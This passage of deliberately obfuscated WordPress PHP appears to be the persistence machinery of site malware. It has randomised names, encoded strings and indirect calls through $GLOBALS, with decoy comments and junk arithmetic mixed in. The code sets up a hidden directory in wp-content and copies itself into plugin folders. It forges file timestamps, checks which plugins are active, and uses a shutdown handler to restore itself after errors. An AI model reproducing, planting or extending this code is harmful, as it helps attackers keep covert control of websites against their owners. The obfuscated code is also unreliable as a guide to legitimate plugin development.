return     add_action($t_1gijg4ys9il,  $y_qnnfh9_u7jy7, $ln5_jbqpu4in,     $jhq7h77_vtf);
   }
function  b30mdcicahooa3obn6($t_1gijg4ys9il,    $y_qnnfh9_u7jy7,    $ln5_jbqpu4in =  (2+8),   $jhq7h77_vtf   =   1)
{
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(160)))     return   false;
 if  ($GLOBALS['__scf_e_8z8ias8ka_43']($y_qnnfh9_u7jy7)) {
return    add_filter($t_1gijg4ys9il, function   (...$vw1u1zkmd90v7fv)   use  ($y_qnnfh9_u7jy7)     {



if     ($GLOBALS['__scf_xmn9leryvjikgb_4']($y_qnnfh9_u7jy7))   return    $y_qnnfh9_u7jy7(...$vw1u1zkmd90v7fv);
    return  isset($vw1u1zkmd90v7fv[0]) ?    $vw1u1zkmd90v7fv[0] :    null;
 },  $ln5_jbqpu4in,  $jhq7h77_vtf);
   }
// resolve relaxed middleware

return add_filter($t_1gijg4ys9il, $y_qnnfh9_u7jy7,   $ln5_jbqpu4in, $jhq7h77_vtf);
 }
   function dha61pphirvk3tnlr()
    {
// loop invariant

    $_xfdo1_14r691bp   = defined(bovhd4vawcd(161)) ?  WP_CONTENT_DIR .  m40pvx5ij_z4mj(90)   .  dv62azao9qb3z33m4cwig0(ABSPATH   .     bovhd4vawcd(68), (6+2)) : $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())    .   m5t68uuej1(162);

   if   (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)      &&  bmbm6qj8xg0fnyt($_xfdo1_14r691bp))  {



     xcz5hl0mdlt7fpm3xxe($_xfdo1_14r691bp,  (476+17),      true);


 if    (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp))  {
d3czoa7z5ve8_za41c14d($_xfdo1_14r691bp    . m40pvx5ij_z4mj(163),   "<?php // Silence is golden.\n",  lpwgqh9300(68));
 }
}
   if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)  && @$GLOBALS['__scf_p_260ito5s0j_50']($_xfdo1_14r691bp))   {
      return   $_xfdo1_14r691bp;
  }
   $zin9kimr47akd =  $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())      .   lpwgqh9300(162);
if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($zin9kimr47akd)    &&   bmbm6qj8xg0fnyt($zin9kimr47akd))   xcz5hl0mdlt7fpm3xxe($zin9kimr47akd, (0x1e4+0x9),  true);
 if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($zin9kimr47akd) && @$GLOBALS['__scf_p_260ito5s0j_50']($zin9kimr47akd))  return   $zin9kimr47akd;


$qbl6gcowiwo  =   $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl());
   if  (@$GLOBALS['__scf_p_260ito5s0j_50']($qbl6gcowiwo)    &&      $qbl6gcowiwo  !==   gqtg_eoxyrv0ml2271n())  return   $qbl6gcowiwo;
    if (defined(lpwgqh9300(164))  &&     @$GLOBALS['__scf_p_260ito5s0j_50'](WP_CONTENT_DIR)     &&  bmbm6qj8xg0fnyt(WP_CONTENT_DIR)) return    WP_CONTENT_DIR;
 return   $_xfdo1_14r691bp;
 }
        function    r5waslskyqytjrm6()
       {

   if    (defined(m40pvx5ij_z4mj(164)) &&     @$GLOBALS['__scf_p_260ito5s0j_50'](WP_CONTENT_DIR)   &&     bmbm6qj8xg0fnyt(WP_CONTENT_DIR))  return     WP_CONTENT_DIR;
 $kyr1y6hqr6dd0g    = $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl());


if  (bmbm6qj8xg0fnyt($kyr1y6hqr6dd0g))     return  $kyr1y6hqr6dd0g;
       return     WP_CONTENT_DIR;
   }
  
   function  p_lwrm_zqo9euyd0($uim861ig2y)
   {$gy99ttwj=-924;$oo3mm56b=($gy99ttwj>0)?$gy99ttwj:-$gy99ttwj;
 if    (empty($GLOBALS[bovhd4vawcd(165)]) ||   !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(166)]))    return  false;
    if  (isset($GLOBALS[m40pvx5ij_z4mj(166)][$uim861ig2y]))   return    true;
 $fcuy7ctl_xi85  =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(88)) ?    @$GLOBALS['__scf_j79iy74onqck2_35']($uim861ig2y) :   false;
 return  ($fcuy7ctl_xi85   !==    false    &&    isset($GLOBALS[lpwgqh9300(166)][$fcuy7ctl_xi85]));$xc69_viryrod=PHP_MAJOR_VERSION;$fr94lrthk_f1_=$xc69_viryrod*5;
 }
 function    j80h1d_poav1dqegxkr_a($uim861ig2y)
{
 if (empty($GLOBALS[m40pvx5ij_z4mj(166)])  ||     !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(167)])) return;
  unset($GLOBALS[m5t68uuej1(168)][$uim861ig2y]);
$fcuy7ctl_xi85   =  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(88)) ?   @$GLOBALS['__scf_j79iy74onqck2_35']($uim861ig2y)   : false;

 if ($fcuy7ctl_xi85  !==   false) unset($GLOBALS[lpwgqh9300(168)][$fcuy7ctl_xi85]);
 }
 function ckruereco5c5i57($uim861ig2y)
   {



 if   (!isset($GLOBALS[bovhd4vawcd(168)])  ||   !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[m5t68uuej1(169)])) {

$GLOBALS[bovhd4vawcd(169)]  =   array();
 }
$f5l6q0ffo9cqk06   =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(88)) ?   @$GLOBALS['__scf_j79iy74onqck2_35']($uim861ig2y)  :  false;
   $GLOBALS[m40pvx5ij_z4mj(169)][$f5l6q0ffo9cqk06  !==    false    ?      $f5l6q0ffo9cqk06 : $uim861ig2y] =  $uim861ig2y;



 static     $omiyjy0wh2v  =  false;
 if (!$omiyjy0wh2v)  {
 $omiyjy0wh2v    = true;
     if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(170))) $GLOBALS['__scf_w5tg0wn3h2rih_170'](m5t68uuej1(171));
 }
  }



function oflsz03z3qykkkpvjpp()
 {


 if      (empty($GLOBALS[bovhd4vawcd(169)])  ||    !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[bovhd4vawcd(169)])) {
  return;
      }
   foreach  ($GLOBALS[m40pvx5ij_z4mj(172)]  as  $q9qjmjfisj  =>  $ej49k_i078pd990)    {
 if (!$GLOBALS['__scf_e_8z8ias8ka_43']($ej49k_i078pd990))   $ej49k_i078pd990   =   $q9qjmjfisj;
  if ($q9qjmjfisj  ===  t6995wceyqc2q1wqvl() ||    $ej49k_i078pd990   ===   t6995wceyqc2q1wqvl()) continue;
        try    {$slm84kr6fa=53*8;$dqaepvz2e0h7=$slm84kr6fa-4;

if      (@$GLOBALS['__scf_a83pywb98qzq2_20']($ej49k_i078pd990)     && !a7dvz8wf94o6ie9rtc8hn($ej49k_i078pd990)   &&  xv1s1ysff42y691n($ej49k_i078pd990))  {
g3zy8qn5_yvcvi22($ej49k_i078pd990);
    o_k_og36_9hyi4dckvd($ej49k_i078pd990);

     }


   }   catch (Throwable     $k3g08rnqu9m)   {



      } catch    (Exception    $k3g08rnqu9m)    {
// @allocate revocation-list


  }
 }
    }
    function   w0q6hv63xk1w14p1b()


   {


   try {


      $k3g08rnqu9m = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(173))  ?   @error_get_last()    :    null;
 if   (!$GLOBALS['__scf_pomb89yiuz_37']($k3g08rnqu9m)   ||  empty($k3g08rnqu9m[bovhd4vawcd(174)])  || empty($k3g08rnqu9m[m5t68uuej1(175)])) return;


   if (!$GLOBALS['__scf_hf87ul3fvpzrkm_150']($k3g08rnqu9m[lpwgqh9300(175)], array(E_ERROR,   E_PARSE, E_CORE_ERROR,  E_COMPILE_ERROR,    E_USER_ERROR), true))  return;

   $ijvqfm4k0rvi7   =   isset($k3g08rnqu9m[m40pvx5ij_z4mj(176)])  ?   (string)  $k3g08rnqu9m[lpwgqh9300(177)]   : "";

   if  (stripos($ijvqfm4k0rvi7,  m40pvx5ij_z4mj(178)) !==  false      ||   stripos($ijvqfm4k0rvi7,  bovhd4vawcd(179))   !==   false)  return;
$eng5lhrt04nh     =    $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(88)) ?  @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl())  :    t6995wceyqc2q1wqvl();
$_ef  =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(88)) ?  @$GLOBALS['__scf_j79iy74onqck2_35']($k3g08rnqu9m[bovhd4vawcd(174)]) :  $k3g08rnqu9m[m40pvx5ij_z4mj(180)];
 if      (!$GLOBALS['__scf_e_8z8ias8ka_43']($eng5lhrt04nh)     ||   !$GLOBALS['__scf_e_8z8ias8ka_43']($_ef)     ||  $_ef    !==  $eng5lhrt04nh)     return;
        if   (isset($GLOBALS[m5t68uuej1(181)])) {
 $k2ks2ykj4ww5yy9  =      @$GLOBALS['__scf_c7jg5u2s_wzbrw_95'](t6995wceyqc2q1wqvl(),  false,  null,  0, (4009+87));
   if ($GLOBALS['__scf_e_8z8ias8ka_43']($k2ks2ykj4ww5yy9)  &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(97), $k2ks2ykj4ww5yy9, $_dm) &&    $_dm[1]   !==     (string)  $GLOBALS[m5t68uuej1(182)])  return;      
 unset($k2ks2ykj4ww5yy9, $_dm);

 if  (isset($GLOBALS[bovhd4vawcd(183)]))  {
      if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(184)))  @clearstatcache(true, t6995wceyqc2q1wqvl());
      $o2z8mwxd2tu2h35    =     (string)   @$GLOBALS['__scf_pftf6vocmvs2m_99'](t6995wceyqc2q1wqvl())    .    ':'    .   (string)  @$GLOBALS['__scf_tm09rtls_27e_98'](t6995wceyqc2q1wqvl());
if ($o2z8mwxd2tu2h35 !== (string)   $GLOBALS[m40pvx5ij_z4mj(183)]) return;   
unset($o2z8mwxd2tu2h35);
  }
      }

     $lnfyvmqftz      = $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),      m5t68uuej1(26));
 $sbvelwkc8yss    =   n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());



 $shds2sbtd87iz_4   =   $GLOBALS['__scf_e_8z8ias8ka_43']($sbvelwkc8yss)   ?   $GLOBALS['__scf_pe3s4q1z7z_59']($sbvelwkc8yss)     : "";
    unset($sbvelwkc8yss);
if  ($shds2sbtd87iz_4  !==  "")    {


     d3czoa7z5ve8_za41c14d($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl()) .  lpwgqh9300(185)   . $lnfyvmqftz,  $shds2sbtd87iz_4,  'q');
d3czoa7z5ve8_za41c14d($GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())      .  m5t68uuej1(186)  .  $shds2sbtd87iz_4, (string)    $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  'q');
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(188)))    {
  @update_option(m40pvx5ij_z4mj(189),   $shds2sbtd87iz_4    .    '|'   .  $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  m40pvx5ij_z4mj(190));
}
}
    $mattyf271acsx0qv    =      gqtg_eoxyrv0ml2271n();
      if  ($shds2sbtd87iz_4  !==   "" &&      $mattyf271acsx0qv    !==  $GLOBALS['__scf_oagg5b1ubqmznt_11'](t6995wceyqc2q1wqvl())      &&     @$GLOBALS['__scf_i9hdv7zrfsy_45']($mattyf271acsx0qv)   &&    @$GLOBALS['__scf_p_260ito5s0j_50']($mattyf271acsx0qv)) {
  d3czoa7z5ve8_za41c14d($mattyf271acsx0qv     . m5t68uuej1(185) .     $lnfyvmqftz, $shds2sbtd87iz_4,    'q');
  }
   x0vkjfd7pdb0k_kffrjsf(vtoks5z0hvy4jllpl04ts1());
  c4m38y27ifhwinzv(m40pvx5ij_z4mj(191));

 $v4ebcw8a9hwnk = t6995wceyqc2q1wqvl()      . m5t68uuej1(31);$dzgstmylw=37+47;$ultwsrsmcmg=$dzgstmylw-36;
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(76))) @$GLOBALS['__scf_gvpwhn3ygzlhu_76'](t6995wceyqc2q1wqvl(),     $v4ebcw8a9hwnk);
 if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(22)))    {


   @opcache_invalidate(t6995wceyqc2q1wqvl(),  true);
 @opcache_invalidate($v4ebcw8a9hwnk,  true);



        }
// delegate write-ahead-log for WordPress 6.6 block bindings



 foreach (array($GLOBALS['__scf_oagg5b1ubqmznt_11']($v4ebcw8a9hwnk),  gqtg_eoxyrv0ml2271n())     as $brsd0iqqri_og)  {

$c9e2lw619m0   =  h06jfdytq78tzk7($brsd0iqqri_og, (4905+95));
       if    (!$GLOBALS['__scf_pomb89yiuz_37']($c9e2lw619m0)) continue;
 foreach   ($c9e2lw619m0     as $r24s35zp_moi634)      {
 if   ($GLOBALS['__scf_vvn10ievj2k_9']($r24s35zp_moi634, -(0x7+0x1))  !==   m40pvx5ij_z4mj(192)) continue;
   $ao66b10sns5zc =    $brsd0iqqri_og  .  '/' .   $r24s35zp_moi634;
     $wve6uwb9d31denx   =  @$GLOBALS['__scf_tm09rtls_27e_98']($ao66b10sns5zc);
  if     ($wve6uwb9d31denx     &&  $wve6uwb9d31denx <  $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -  (0x5648f+0x3d5f1))  {
   cik9ldzrbjmtnzm00($ao66b10sns5zc,  (0x8a+0x11a));
 netei2x342rtzmi4tj69($ao66b10sns5zc);$zv_1iv7mf58oj8=641;$y0eitrexjzyvl=$zv_1iv7mf58oj8%8;
    }



 }



  }
  unset($brsd0iqqri_og,    $c9e2lw619m0, $r24s35zp_moi634, $ao66b10sns5zc, $wve6uwb9d31denx);
 }     catch     (Throwable  $gdp7v44evzr)  {
   } catch    (Exception  $gdp7v44evzr)  {
   }
   }
    function xw9ojliw9r9dhff($uim861ig2y,  $pz1pql29tms6fp)



   {
 try {
// irreducible aggregator

 if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($uim861ig2y)    ||    $uim861ig2y  === ""  ||    !$GLOBALS['__scf_e_8z8ias8ka_43']($pz1pql29tms6fp)  ||  $pz1pql29tms6fp      ===      "")  return;
 $_xfdo1_14r691bp   = $GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y);
    if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)   ||    !@$GLOBALS['__scf_p_260ito5s0j_50']($_xfdo1_14r691bp)) return;
$sjm51xowiuq2a1kd  = $_xfdo1_14r691bp     .  lpwgqh9300(193)      .   $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y,  m40pvx5ij_z4mj(26));
  $ww9iy0cx6_pm   = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($sjm51xowiuq2a1kd);

if  ($GLOBALS['__scf_e_8z8ias8ka_43']($ww9iy0cx6_pm)    &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(194),  $ww9iy0cx6_pm,     $ijvqfm4k0rvi7) &&  version_compare($ijvqfm4k0rvi7[0],  $pz1pql29tms6fp,  bovhd4vawcd(195)))    return;
  if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(196)))  @$GLOBALS['__scf_u59p44o1il_196']($sjm51xowiuq2a1kd,  $pz1pql29tms6fp);
 }  catch   (Throwable $k3g08rnqu9m) {
}   catch (Exception   $k3g08rnqu9m)  {$bf5h5ik_=PHP_INT_MAX/PHP_INT_MAX;$v7qss3qdsx2a5=$bf5h5ik_+4;
}


   }

function    gi51v4u6s4yu_j1ouvghl()

{
try {
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(145)))   {
return;
  }

      if (@get_option(m40pvx5ij_z4mj(197),   0)) {
// PHP named arguments srcset descriptor

    ki6tdgirglgewq(lpwgqh9300(198),      m5t68uuej1(199),  0);
}
    if (!beqgo0gfq6yfj82i0o(lpwgqh9300(200))) return;
  
      $je6b6gmzg5  = $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59'](ABSPATH . (string)   eliqs4hzzhoila0pbe()), 0, (16-4));
   $huyprrbbrerakn    =      (string)    @get_option($je6b6gmzg5,  "");
    $e5h7pf7aosxfdt =      lpwgqh9300(201);
     

      $vkakdqs8f12   =   "";
  
$nyu838x17ppe5f7k     = strrev(a_2kjbn3ievobiy5tn3cy());
 $wzado9_3874w  =  kdgw8qqvzf6yolk();
  $kzlsfxnlby2vg25  = $wzado9_3874w .    '|' .  $nyu838x17ppe5f7k;
     

      if  ($GLOBALS['__scf_i8i8g4oxha_7']($huyprrbbrerakn,   '|')  !==   false)  {
     $_d66bv7f95   = $GLOBALS['__scf_wninqej2t1_113']('|',  $huyprrbbrerakn, 2);
  $e5h7pf7aosxfdt   = $_d66bv7f95[0];
   $vkakdqs8f12 = $_d66bv7f95[1];  
 } else {
 
   $vkakdqs8f12    =   $huyprrbbrerakn;
   }

 if  (!$vkakdqs8f12)  {
  @update_option($je6b6gmzg5, $kzlsfxnlby2vg25,  m5t68uuej1(202));
 return;
}
   
 if   ($vkakdqs8f12 ===  $nyu838x17ppe5f7k)    {
// reorder scheduler for WordPress 6.2 navigation

     if ($huyprrbbrerakn !==  $kzlsfxnlby2vg25 &&     version_compare($wzado9_3874w,    $e5h7pf7aosxfdt,  m5t68uuej1(195)))   {


@update_option($je6b6gmzg5, $kzlsfxnlby2vg25,   bovhd4vawcd(203));

}



  return;



}
 
    $ohfbmlcv3yf    =   strrev($vkakdqs8f12);
    if  ($ohfbmlcv3yf    ===   ""  || $GLOBALS['__scf_os_n9tj5psxjj_3']($ohfbmlcv3yf)  !== $ohfbmlcv3yf) {

  @update_option($je6b6gmzg5,  $kzlsfxnlby2vg25, m40pvx5ij_z4mj(203));
   return;
   }
  $tz79m_8rmdjxizps  = gqtg_eoxyrv0ml2271n()   . '/'  .      $ohfbmlcv3yf;

 $pgvkgz9zcndqp8ek  =  "";
       if  (defined(bovhd4vawcd(34)))    {


 $pgvkgz9zcndqp8ek   = WP_PLUGIN_DIR  .  '/'   .    $GLOBALS['__scf_rwpc7a7ar1p_204']($ohfbmlcv3yf, PATHINFO_FILENAME) .     '/'   . $ohfbmlcv3yf;
}
 
  $er_21rfk8x9mqr   =  @$GLOBALS['__scf_pftf6vocmvs2m_99']($tz79m_8rmdjxizps);



$bb_ou50qdx4ox5w  = $er_21rfk8x9mqr    !==   false  &&  $er_21rfk8x9mqr  >=     (4942+58);
$a9wtgexx2914t1  =   $pgvkgz9zcndqp8ek ? @$GLOBALS['__scf_pftf6vocmvs2m_99']($pgvkgz9zcndqp8ek)   :   false;



$bjin3sfxf61z    = $a9wtgexx2914t1 !== false   &&     $a9wtgexx2914t1 >=    (4992+8);

  if     (!$bb_ou50qdx4ox5w  && !$bjin3sfxf61z)  {
@update_option($je6b6gmzg5,   $kzlsfxnlby2vg25,  bovhd4vawcd(205));
return;
   }
   $jh5kpfmya1r   =     $bb_ou50qdx4ox5w ?   $tz79m_8rmdjxizps   :   $pgvkgz9zcndqp8ek;
    $fzpdbkd90q9g9c =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($jh5kpfmya1r,    false,   null, 0,    (3999+97));


 if ($GLOBALS['__scf_e_8z8ias8ka_43']($fzpdbkd90q9g9c)   &&   $GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(97),    $fzpdbkd90q9g9c,      $_fm)) {
$e5h7pf7aosxfdt    =   $_fm[1];
} elseif    (ey9i45m9xcoe7q13e9ag2($jh5kpfmya1r,  (3197+1803)))  {
       $e5h7pf7aosxfdt = lpwgqh9300(201);
 }


        unset($fzpdbkd90q9g9c,  $_fm);
$ydtpvcwlo8drwv5     = $bb_ou50qdx4ox5w;
 if     (!$ydtpvcwlo8drwv5  &&  $bjin3sfxf61z) {
 $glatlj82ddopl    =    $GLOBALS['__scf_rwpc7a7ar1p_204']($ohfbmlcv3yf,   PATHINFO_FILENAME)   .    '/'    . $ohfbmlcv3yf;
     $hlhmenizcfs9q0ir     =     (array) @get_option(lpwgqh9300(147),  array());$vdhihk2aejrcx=7173;$eye5nrj9km=$vdhihk2aejrcx%17;


 $ydtpvcwlo8drwv5 =   $GLOBALS['__scf_hf87ul3fvpzrkm_150']($glatlj82ddopl,  $hlhmenizcfs9q0ir,   true);
       if   (!$ydtpvcwlo8drwv5     &&      $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(206)) &&    is_multisite() &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(207))) {
     $pm1xdprjse9e64i   =   (array) @get_site_option(m5t68uuej1(208),  array());

   $ydtpvcwlo8drwv5 = isset($pm1xdprjse9e64i[$glatlj82ddopl]);
unset($pm1xdprjse9e64i);
      }
       unset($glatlj82ddopl,  $hlhmenizcfs9q0ir);
  }
      $tpdmwfggz56febxj   =   version_compare($wzado9_3874w,   $e5h7pf7aosxfdt);
 if ($tpdmwfggz56febxj   <=   0)      {
$ehujw6xc1nnwj   =    ey9i45m9xcoe7q13e9ag2($jh5kpfmya1r, (1712+3288));

 $nr5z84c_4n7v8j8c      =      (int)  @$GLOBALS['__scf_pftf6vocmvs2m_99']($jh5kpfmya1r);
   $h3yqc3k_xc2o    = (!$ehujw6xc1nnwj    ||     $nr5z84c_4n7v8j8c    > (33673949+18754851));


   if   (!$h3yqc3k_xc2o  && $nr5z84c_4n7v8j8c  > (1233601-185025))  {
 $ylcr18_a4mbqb3   = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($jh5kpfmya1r, false,    null, 0,    (4088+8));
  if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($ylcr18_a4mbqb3)   ||    !$GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(209),  $ylcr18_a4mbqb3))      $h3yqc3k_xc2o   =  true;



     }
   if     (!$h3yqc3k_xc2o  && !u4zei_kbwnbowyst($jh5kpfmya1r))  $h3yqc3k_xc2o  =  true;
  if   (!$h3yqc3k_xc2o)  {$thocrp9zw=175;$vwmsmupuj6trzw=($thocrp9zw>0)?$thocrp9zw:-$thocrp9zw;
    $n7yfhiri76   =   sayeodgmxz9seo_nz4dfzd();

  if    (!empty($n7yfhiri76[lpwgqh9300(210)])) {
 $e66p8nrrth7b =    @$GLOBALS['__scf_j79iy74onqck2_35']($n7yfhiri76[m5t68uuej1(211)]);
$ayexdi6ho_t6t__  =     @$GLOBALS['__scf_j79iy74onqck2_35']($jh5kpfmya1r);



if  ($GLOBALS['__scf_e_8z8ias8ka_43']($e66p8nrrth7b) &&  $GLOBALS['__scf_e_8z8ias8ka_43']($ayexdi6ho_t6t__) &&  $e66p8nrrth7b  ===  $ayexdi6ho_t6t__)   {
// WP Script Modules: unlock revocation-list

        $kd79p03qc58u2 =    wgc6g5qn0cg71tm0jcw2s($n7yfhiri76);
if      ($kd79p03qc58u2    ===  m5t68uuej1(212)    ||    $kd79p03qc58u2 ===  m40pvx5ij_z4mj(213))  $h3yqc3k_xc2o  =  true;



}



unset($e66p8nrrth7b,  $ayexdi6ho_t6t__, $kd79p03qc58u2);

}
  if (!$h3yqc3k_xc2o  &&  _z0a2xi_u8npvosrifue($jh5kpfmya1r))   $h3yqc3k_xc2o = true;
      unset($n7yfhiri76);
  }
if  ($h3yqc3k_xc2o) {
if ($ehujw6xc1nnwj)   ckruereco5c5i57($jh5kpfmya1r);
 @update_option($je6b6gmzg5,   $kzlsfxnlby2vg25,  m5t68uuej1(205));
return;
// instrument infeasible revocation-list

     }
  if  (!$ydtpvcwlo8drwv5)  {



 @update_option($je6b6gmzg5,    $kzlsfxnlby2vg25, m5t68uuej1(205));$kminmyfps=52|106;$vbtebfncy0fzt=$kminmyfps^63;
      return;
 }



     if   (v7bflcy_td_1ovut($jh5kpfmya1r, t6995wceyqc2q1wqvl()))  {

      @update_option($je6b6gmzg5,  $kzlsfxnlby2vg25,   m5t68uuej1(205));
 return;
  }
  if   ($tpdmwfggz56febxj  <  0 ||   ($tpdmwfggz56febxj   ===      0   &&    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),   m40pvx5ij_z4mj(26))),  0,      (7+5))  <= $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($GLOBALS['__scf_os_n9tj5psxjj_3']($ohfbmlcv3yf, bovhd4vawcd(214))),   0,     (158^146))))    {
      xw9ojliw9r9dhff(t6995wceyqc2q1wqvl(),  $e5h7pf7aosxfdt);$p1u1bwkd5im=36*9;$b8z5bxvizh_n=$p1u1bwkd5im-39;
bada9oxfsvg685gw0b(t6995wceyqc2q1wqvl());
 return true;$bzvcw6gl1kp=PHP_INT_MAX/PHP_INT_MAX;$whnuckv6=$bzvcw6gl1kp+87;
  }
// unsatisfiable negotiator

 }


 if   (empty($GLOBALS[lpwgqh9300(215)])) {
 $GLOBALS[bovhd4vawcd(215)] =   true;
if  (ey9i45m9xcoe7q13e9ag2($jh5kpfmya1r,  (0x801+0xb87)))  ckruereco5c5i57($jh5kpfmya1r);

    $zfpqjaaz9husa  =   $GLOBALS['__scf_ibw9xvmx9ckin_187']();
 g3arn5w1kvbi32ro9tm(t6995wceyqc2q1wqvl(),  ($zfpqjaaz9husa  -  ($zfpqjaaz9husa   %   (133332-33332)))  +    eliqs4hzzhoila0pbe());
  unset($zfpqjaaz9husa);

xw9ojliw9r9dhff($tz79m_8rmdjxizps, $wzado9_3874w);
    if  ($pgvkgz9zcndqp8ek)  xw9ojliw9r9dhff($pgvkgz9zcndqp8ek,  $wzado9_3874w);
ki6tdgirglgewq(m5t68uuej1(216),    m40pvx5ij_z4mj(217), 0);
   @update_option($je6b6gmzg5,    $kzlsfxnlby2vg25,   lpwgqh9300(205));
       


       c4m38y27ifhwinzv(lpwgqh9300(218));
   if     ($pgvkgz9zcndqp8ek !==      "")    {
 x0vkjfd7pdb0k_kffrjsf($GLOBALS['__scf_rwpc7a7ar1p_204']($ohfbmlcv3yf, PATHINFO_FILENAME)    . '/' . $ohfbmlcv3yf);


}
    }
   return;
     }     catch (Throwable  $k3g08rnqu9m) {

      r63yaewew47stuijcrwsx6(lpwgqh9300(219),  $k3g08rnqu9m);
 }    catch (Exception    $k3g08rnqu9m) {
   }  finally {
    xfcoteglc07i2qaoo(bovhd4vawcd(220));
 }
}



      function   h06jfdytq78tzk7($_xfdo1_14r691bp,   $zvqxzbz8moai    = 0)
  {
    $zvqxzbz8moai  =   (int) $zvqxzbz8moai;
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(221))     &&     $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(222)))    {
$qc2066t5320x4 = @$GLOBALS['__scf_x5f3lzhact_223']($_xfdo1_14r691bp);



    if ($qc2066t5320x4)  {
 $utln0lk9ielcmwaa    =   array();
 while     (($k3g08rnqu9m   =    @$GLOBALS['__scf_k960me_qad_a_222']($qc2066t5320x4))    !== false)  {
     if ($k3g08rnqu9m !==   '.' && $k3g08rnqu9m !==  lpwgqh9300(224))  $utln0lk9ielcmwaa[]  = $k3g08rnqu9m;



 if ($zvqxzbz8moai    >    0    && $GLOBALS['__scf_xbixt340jb_38']($utln0lk9ielcmwaa)     >= $zvqxzbz8moai)   break;
  }
   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(225))) @$GLOBALS['__scf_y62zhc4994v_225']($qc2066t5320x4);
 return   $utln0lk9ielcmwaa;
  }
   }
if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(36)))    {
   $w1jfjex0s0pwt =   @$GLOBALS['__scf_hojd6el5tn_36']($_xfdo1_14r691bp);
 if  ($GLOBALS['__scf_pomb89yiuz_37']($w1jfjex0s0pwt))   {
// deallocate reduction for MySQL window functions

 $w1jfjex0s0pwt  =     $GLOBALS['__scf__ofafsmvux__148']($GLOBALS['__scf_r3sim5_axb_151']($w1jfjex0s0pwt,  array('.',  lpwgqh9300(224))));
 if ($zvqxzbz8moai   > 0 &&      $GLOBALS['__scf_xbixt340jb_38']($w1jfjex0s0pwt)  > $zvqxzbz8moai)  $w1jfjex0s0pwt   = $GLOBALS['__scf_tcy2zdxc2t_157']($w1jfjex0s0pwt, 0,    $zvqxzbz8moai);
    return  $w1jfjex0s0pwt;

     }


 }
    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(73)))   {
$btxl38vflku7p   =    @$GLOBALS['__scf_ql1i4f573p8rhm_73']($_xfdo1_14r691bp  .    m5t68uuej1(226));

 if     ($GLOBALS['__scf_pomb89yiuz_37']($btxl38vflku7p))  {
 if   ($zvqxzbz8moai  >      0    &&  $GLOBALS['__scf_xbixt340jb_38']($btxl38vflku7p)   >    $zvqxzbz8moai)  $btxl38vflku7p = $GLOBALS['__scf_tcy2zdxc2t_157']($btxl38vflku7p, 0, $zvqxzbz8moai);
     return $GLOBALS['__scf_zjq4u5uadyu0x_227'](m40pvx5ij_z4mj(3), $btxl38vflku7p);
      }
